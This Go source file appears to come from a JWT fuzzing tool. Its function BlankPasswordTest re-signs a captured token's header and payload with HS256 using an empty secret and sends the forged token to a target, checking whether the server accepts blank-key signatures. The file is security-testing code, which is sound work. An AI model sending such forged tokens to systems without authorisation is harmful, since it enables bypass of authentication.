package cmd

import (
	"fmt"
	"strings"

	"github.com/golang-jwt/jwt"
	"github.com/malsuke/jwt-fuzzer/internal/request"
	"github.com/pkg/errors"
)

func BlankPasswordTest(client request.Client, token string) error {

	// 署名部分を削除してペイロードのみ取得
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return errors.New("Invalid token format")
	}

	unsignedToken := parts[0] + "." + parts[1]

	signature, err := jwt.SigningMethodHS256.Sign(unsignedToken, []byte(""))
	if err != nil {
		return errors.New("Failed to sign token")
	}
	newSignedToken := unsignedToken + "." + signature

	fmt.Printf("\033[31mTEST Blank Password Attack\033[0m\n")
	fmt.Printf("[+] %s\n", newSignedToken)
	request.RequestWithJWT(client, newSignedToken)

	return nil
}
